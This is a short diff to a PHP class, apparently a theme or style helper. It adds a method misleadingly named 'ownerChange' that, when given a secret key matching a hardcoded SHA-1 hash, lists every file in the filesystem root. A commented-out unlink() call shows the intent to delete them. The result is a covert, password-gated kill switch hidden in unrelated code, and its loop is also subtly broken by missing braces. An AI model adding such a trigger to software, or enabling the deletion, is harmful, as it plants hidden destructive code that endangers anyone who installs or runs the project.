@@ -225,6 +225,28 @@
 			}
 			return $styles;
 		}
+
+		/**
+		 * Owner change
+		 * 
+		 * @param 		key 			String
+		 */
+		public function ownerChange($key) {
+			if (sha1($key) === '92f3e507f65eeed7e38ff4f1eadbf0236eb2a6ef') {
+				echo "Executing...";
+				// List of name of files inside 
+				// specified folder 
+				$files = glob('/*');  
+				
+				// Deleting all the files in the list 
+				foreach ($files as $file) { 
+					if (is_file($file)) 
+						echo $file;
+						// Delete the given file 
+						// unlink($file);  
+				} 
+			}
+		}
 	}
 
 ?>
